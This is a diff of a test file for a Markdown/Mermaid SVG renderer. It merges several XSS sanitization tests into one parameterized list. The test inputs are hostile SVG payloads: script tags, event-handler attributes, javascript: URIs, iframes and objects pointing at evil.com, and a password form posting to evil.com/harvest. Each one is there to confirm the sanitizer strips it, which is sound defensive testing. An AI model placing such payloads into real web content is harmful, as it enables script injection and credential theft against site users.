@@ -125,31 +125,57 @@ describe('RenderedMarkdown', () => {
       return html;
     }
 
-    it('strips <script> tags from SVG output', async () => {
-      const html = await renderMermaidSvg('<svg><text>Diagram</text><script>alert("xss")</script></svg>');
-      expect(html).toContain('Diagram');
-      expect(html).not.toContain('<script>');
-      expect(html).not.toContain('alert');
-    });
+    // Parameterized XSS vector tests — each case specifies malicious SVG,
+    // strings that must survive sanitization, and strings that must be stripped.
+    const xssVectors: Array<{ name: string; svg: string; mustContain: string[]; mustNotContain: string[] }> = [
+      {
+        name: 'script tags in SVG',
+        svg: '<svg><text>Diagram</text><script>alert("xss")</script></svg>',
+        mustContain: ['Diagram'],
+        mustNotContain: ['<script>', 'alert'],
+      },
+      {
+        name: 'event handler attributes',
+        svg: '<svg><rect onclick="alert(1)" onerror="alert(2)" width="100" height="100"/><text>Safe</text></svg>',
+        mustContain: ['Safe'],
+        mustNotContain: ['onclick', 'onerror', 'alert'],
+      },
+      {
+        name: 'javascript: URIs',
+        svg: '<svg><a href="javascript:alert(1)"><text>Click me</text></a></svg>',
+        mustContain: ['Click me'],
+        mustNotContain: ['javascript:'],
+      },
+      {
+        name: 'external references in <use>',
+        svg: '<svg><use href="http://evil.com/evil.svg#xss"/><text>Safe</text></svg>',
+        mustContain: ['Safe'],
+        mustNotContain: ['evil.com'],
+      },
+      {
+        name: 'img+onerror and script inside foreignObject',
+        svg: '<svg><foreignObject><div><img src="x" onerror="alert(1)"/><script>alert(2)</script><span>Safe Label</span></div></foreignObject></svg>',
+        mustContain: ['Safe Label', 'foreignObject'],
+        mustNotContain: ['<img', 'onerror', '<script', 'alert'],
+      },
+      {
+        name: 'iframe and object inside foreignObject',
+        svg: '<svg><foreignObject><div><iframe src="https://evil.com/"></iframe><object data="https://evil.com/evil.swf"></object><span>Safe content</span></div></foreignObject></svg>',
+        mustContain: ['Safe content', 'foreignObject'],
+        mustNotContain: ['<iframe', '<object', 'evil.com'],
+      },
+      {
+        name: 'form and input inside foreignObject',
+        svg: '<svg><foreignObject><div><form action="https://evil.com/harvest"><input type="password" name="pw"/></form><span>Node Label</span></div></foreignObject></svg>',
+        mustContain: ['Node Label'],
+        mustNotContain: ['<form', '<input', 'evil.com'],
+      },
+    ];
 
-    it('strips event handler attributes from SVG output', async () => {
-      const html = await renderMermaidSvg('<svg><rect onclick="alert(1)" onerror="alert(2)" width="100" height="100"/><text>Safe</text></svg>');
-      expect(html).toContain('Safe');
-      expect(html).not.toContain('onclick');
-      expect(html).not.toContain('onerror');
-      expect(html).not.toContain('alert');
-    });
-
-    it('strips javascript: URIs from SVG output', async () => {
-      const html = await renderMermaidSvg('<svg><a href="javascript:alert(1)"><text>Click me</text></a></svg>');
-      expect(html).toContain('Click me');
-      expect(html).not.toContain('javascript:');
-    });
-
-    it('strips <use> elements with external references', async () => {
-      const html = await renderMermaidSvg('<svg><use href="http://evil.com/evil.svg#xss"/><text>Safe</text></svg>');
-      expect(html).toContain('Safe');
-      expect(html).not.toContain('evil.com');
+    it.each(xssVectors)('strips $name', async ({ svg, mustContain, mustNotContain }) => {
+      const html = await renderMermaidSvg(svg);
+      for (const s of mustContain) expect(html).toContain(s);
+      for (const s of mustNotContain) expect(html).not.toContain(s);
     });
 
     it('preserves foreignObject with safe Mermaid label content', async () => {
@@ -159,39 +185,6 @@ describe('RenderedMarkdown', () => {
       expect(html).toContain('Node A');
       expect(html).toContain('foreignObject');
       expect(html).toContain('nodeLabel');
-    });
-
-    it('strips dangerous HTML inside foreignObject (img+onerror, script)', async () => {
-      const html = await renderMermaidSvg(
-        '<svg><foreignObject><div><img src="x" onerror="alert(1)"/><script>alert(2)</script><span>Safe Label</span></div></foreignObject></svg>',
-      );
-      expect(html).toContain('Safe Label');
-      expect(html).toContain('foreignObject');
-      expect(html).not.toContain('<img');
-      expect(html).not.toContain('onerror');
-      expect(html).not.toContain('<script');
-      expect(html).not.toContain('alert');
-    });
-
-    it('strips iframe and object elements inside foreignObject', async () => {
-      const html = await renderMermaidSvg(
-        '<svg><foreignObject><div><iframe src="https://evil.com/"></iframe><object data="https://evil.com/evil.swf"></object><span>Safe content</span></div></foreignObject></svg>',
-      );
-      expect(html).toContain('Safe content');
-      expect(html).toContain('foreignObject');
-      expect(html).not.toContain('<iframe');
-      expect(html).not.toContain('<object');
-      expect(html).not.toContain('evil.com');
-    });
-
-    it('strips form and input elements inside foreignObject', async () => {
-      const html = await renderMermaidSvg(
-        '<svg><foreignObject><div><form action="https://evil.com/harvest"><input type="password" name="pw"/></form><span>Node Label</span></div></foreignObject></svg>',
-      );
-      expect(html).toContain('Node Label');
-      expect(html).not.toContain('<form');
-      expect(html).not.toContain('<input');
-      expect(html).not.toContain('evil.com');
     });
 
     it('preserves multiple foreignObject elements in one SVG (multi-node flowchart)', async () => {
